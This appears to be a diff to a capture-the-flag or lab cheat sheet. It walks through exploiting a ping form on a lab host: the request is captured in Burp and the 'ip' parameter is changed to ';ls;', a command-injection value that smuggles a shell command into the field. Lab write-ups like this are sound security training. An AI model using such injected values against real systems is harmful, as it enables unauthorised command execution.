@@ -128,7 +128,10 @@ Cheat Sheet
 
 Solution:- 
 
-1) go to 
+1) go to target by searching 94.237.55.61:50073  in search bar
+2) youll see an option "PING 127.0.0.  "  , in that add "1" (127.0.0.1) Now you have your local host ip> now hit the "Ping" button
+3) Ping req sent to 127.0.0.1> capture it using Burp interceptor> view request :-
+```
 POST /ping HTTP/1.1
 Host: 94.237.55.61:50073
 User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
@@ -146,3 +149,7 @@ Sec-GPC: 1
 Priority: u=0, i
 
 ip=1
+```
+
+change the `ip` parameter's value from `1` to `;ls;`
+
